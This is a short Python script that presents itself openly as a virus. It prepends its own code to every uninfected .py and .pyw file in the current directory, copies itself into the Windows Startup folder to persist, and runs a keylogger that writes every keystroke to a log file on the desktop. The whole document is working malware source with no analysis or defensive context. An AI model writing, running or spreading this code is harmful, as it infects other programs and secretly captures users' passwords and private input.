# Virus Beginning

import sys
import glob
import os
import logging
from shutil import copyfile
from pynput.keyboard import Listener

code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
virus_area = False
for line in lines:
    if line == '# Virus Beginning\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '# Virus End\n':
        break

python_scripts = glob.glob('*.py') + glob.glob('*.pyw')

for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readlines()

    infected = False
    for line in script_code:
        if line == '# Virus Beginning\n':
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.append('\n') 
        final_code.extend(script_code)

        with open(script, 'w') as f:
            f.writelines(final_code)


username = os.getlogin()
logging_directory = f"/Users/{username}/Desktop"


copyfile(sys.argv[0], f'C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/main.py')


logging.basicConfig(filename=f"{logging_directory}/mylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def key_handler(key):
    logging.info(key)

with Listener(on_press=key_handler) as listener:
    listener.join() 
